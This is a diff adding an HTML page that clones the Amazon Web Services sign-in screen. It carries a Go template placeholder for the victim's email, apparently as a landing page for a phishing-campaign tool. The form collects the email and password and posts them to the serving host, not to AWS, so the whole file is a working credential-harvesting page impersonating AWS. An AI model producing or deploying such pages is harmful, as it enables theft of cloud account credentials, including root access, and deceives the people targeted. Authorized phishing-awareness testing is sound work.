@@ -1,0 +1,64 @@
+<!DOCTYPE html><html lang="en"><head>
+	<title>Amazon Web Services Sign-In</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+	<link href="https://signin.aws.amazon.com/static/styles/components.css" rel="stylesheet" type="text/css"/>
+	<link href="https://signin.aws.amazon.com/static/css/aws-signin.css" rel="stylesheet" type="text/css"/>
+</head>
+<body class="awsui aws-signin-ui" style="margin-top: 30px; margin-right:40px; margin-bottom:20px; margin-left:40px;">
+<div class="aws-signin-main-box fixed-width" id="signin-main-box">
+<div class="aws-signin-logo-header-box" id="logo_container">
+<h1 class="background-left" id="logo_head"><a class="aws-signin-text-small" href="https://aws.amazon.com/" id="logo_link" rel="noopener noreferrer">Amazon Web Services Login</a></h1>
+</div>
+
+<div class="main-table" id="main_content">
+<div class="aws-signin-float-left" id="signin_container">
+<div class="aws-signin-login-general-box" id="signin_inner_container">
+<div class="signin-container" id="resolver_container">
+<div class="aws-signin-login-header-box" id="signin_head_box"><b class="awsui-text-bigger" id="signin_head">Sign in</b></div>
+
+<div id="aws-signin-general-user-selection">
+<div class="aws-signin-radio-border aws-signin-radio-selection" id="aws-signin-general-user-selection-root"><input checked="checked" class="aws-signin-radio" id="root_user_radio_button" name="userType" type="radio" value="rootUser"/> <label class="aws-signin-text-bold" for="rootUser">Root user</label>
+
+<div id="aws-signin-general-user-selection-paragraph"><span class="aws-signin-text-small">Account owner that performs tasks requiring unrestricted access. <a href="#" target="_blank">Learn more</a></span></div>
+</div>
+
+<div class="aws-signin-radio-border" id="aws-signin-general-user-selection-iam"><input class="aws-signin-radio" id="iam_user_radio_button" name="userType" type="radio" value="iamUser"/> <label class="aws-signin-text-bold" for="iamUser">IAM user</label>
+
+<div id="aws-signin-general-user-selection-paragraph"><span class="aws-signin-text-small">User within an account that performs daily tasks. <a href="#" target="_blank">Learn more</a></span></div>
+</div>
+</div>
+
+<form action="" class="login-form" method="post" name="login-form">
+<div class="aws-signin-general-label-box"><b class="awsui-text-normal" id="resolving_input_label">Root user email address</b></div>
+
+<div class="aws-signin-general-input-box"><input autocapitalize="none" autocorrect="off" class="aws-signin-textfield" id="resolving_input" placeholder="username@example.com" type="email" value="{{.Email}}"/></div>
+
+<div class="aws-signin-general-label-box"><b class="awsui-text-normal" id="resolving_input_label">Password</b></div>
+
+<div class="aws-signin-general-input-box"><input autocapitalize="none" autocorrect="off" class="aws-signin-textfield" id="resolving_input" placeholder="" type="pasword" value=""/></div>
+
+<div class="aws-signin-general-button-box"><button class="aws-signin-button aws-signin-button-size-normal aws-signin-button-variant-primary aws-signin-button-width-full" id="next_button" type="submit"><span class="aws-signin-color-white" id="next_button_text">Login</span></button></div>
+
+<div class="aws-signin-text-small"><span>By continuing, you agree to the <a href="https://aws.amazon.com/agreement/" target="_blank">AWS Customer Agreement</a> or other agreement for AWS services, and the <a href="https://aws.amazon.com/privacy/" target="_blank">Privacy Notice</a>. This site uses essential cookies. See our <a href="https://aws.amazon.com/legal/cookies" target="_blank">Cookie Notice</a> for more information.</span></div>
+</form>
+<!-- New Account -->
+
+<div class="aws-signin-new-account-box" id="new_account_container">
+<div class="signin-break-wrapper"><span class="aws-signin-color-mid-gray">New to AWS?</span></div>
+
+<div class="aws-signin-general-button-box"><button class="awsui-button awsui-button-size-normal awsui-button-variant-normal awsui-hover-child-icons aws-signin-button-width-full" id="create_aws_account">Create a new AWS account</button></div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="aws-signin-display-block" data-slot-id="signin-banner" id="marketing_container"><a href="https://explore.skillbuilder.aws/learn" id="marketingimagelink" rel="noopener" target="_blank"><img alt="Amazon Web Services Marketing" height="450" src="https://d1.awsstatic.com/Digital%20Marketing/sitemerch/sign-in/en/Site-Merch_AWS_Skill_Builder_Sign-In_EN.19fb619b4c5d8ef0cf394981901c3b0f171907d2.png" width="570"/></a></div>
+</div>
+
+<div id="smallprint" style="margin-top: 30px; margin-bottom:20px;">
+<div class="textinput" style="margin-top: 40px;"><span class="aws-signin-text-small">© 2023, Amazon Web Services, Inc. or its affiliates. All rights reserved.</span></div>
+</div>
+</div>
+
+
+</body></html>
